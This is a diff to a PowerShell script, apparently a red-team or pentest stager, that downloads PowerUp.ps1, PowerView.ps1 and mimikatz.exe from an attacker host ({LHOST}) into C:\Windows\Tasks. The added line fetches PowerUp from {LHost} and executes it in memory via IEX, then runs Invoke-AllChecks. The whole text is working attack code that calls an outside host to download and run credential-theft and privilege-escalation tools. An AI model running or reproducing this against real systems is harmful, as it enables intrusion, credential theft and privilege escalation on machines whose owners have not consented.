@@ -4,7 +4,7 @@
 
 # # # Multi Target
 $baseUrl = "http://{LHOST}/"
-$fileNames = @("Invoke-EventViewer.ps1", "/powershell/powerview-dev.ps1", "powerup.ps1")
+$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
 $downloadPath = "C:\Windows\Tasks"
 
 foreach ($fileName in $fileNames) {
@@ -13,5 +13,5 @@ foreach ($fileName in $fileNames) {
 	Invoke-WebRequest -Uri $url -OutFile $filePath
 	Write-Host "Downloaded $fileName to $filePath"
 }
-
+IEX (New-Object Net.WebClient).DownloadString(‘https://{LHost}/PowerUp.ps1’);Invoke-AllChecks
 
